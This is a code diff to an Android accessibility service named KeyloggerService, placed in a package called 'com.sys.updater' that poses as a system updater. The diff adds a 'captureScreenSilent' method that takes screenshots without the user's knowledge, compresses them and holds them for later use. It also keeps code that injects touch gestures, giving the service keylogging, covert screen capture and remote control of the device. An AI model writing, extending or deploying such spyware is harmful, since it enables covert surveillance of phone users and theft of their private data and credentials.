@@ -3,11 +3,9 @@ package com.sys.updater;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityService.ScreenshotResult;
 import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
-import android.accessibilityservice.GestureDescription;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.Path;
-import android.graphics.PixelFormat;
 import android.hardware.HardwareBuffer;
 import android.os.Build;
 import android.os.Bundle;
@@ -147,8 +145,8 @@ public class KeyloggerService extends AccessibilityService {
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            GestureDescription.Builder builder = new GestureDescription.Builder();
-            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
+            android.accessibilityservice.GestureDescription.Builder builder = new android.accessibilityservice.GestureDescription.Builder();
+            builder.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 300));
             dispatchGesture(builder.build(), null, null);
         }
     }
@@ -180,6 +178,27 @@ public class KeyloggerService extends AccessibilityService {
         }
     }
 
+    public void captureScreenSilent() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
+                @Override
+                public void onSuccess(ScreenshotResult screenshotResult) {
+                    try {
+                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
+                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
+                        if (bitmap == null) { buffer.close(); return; }
+                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, 480, 800, true);
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        resized.compress(Bitmap.CompressFormat.JPEG, 30, baos);
+                        latestFrame = baos.toByteArray();
+                        buffer.close();
+                    } catch (Exception e) {}
+                }
+                @Override public void onFailure(int errorCode) {}
+            });
+        }
+    }
+
     private void takeLiveScreenshot() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
@@ -203,4 +222,4 @@ public class KeyloggerService extends AccessibilityService {
 
     @Override public void onInterrupt() { instance = null; }
     @Override public void onDestroy() { instance = null; super.onDestroy(); }
-                            }
+}
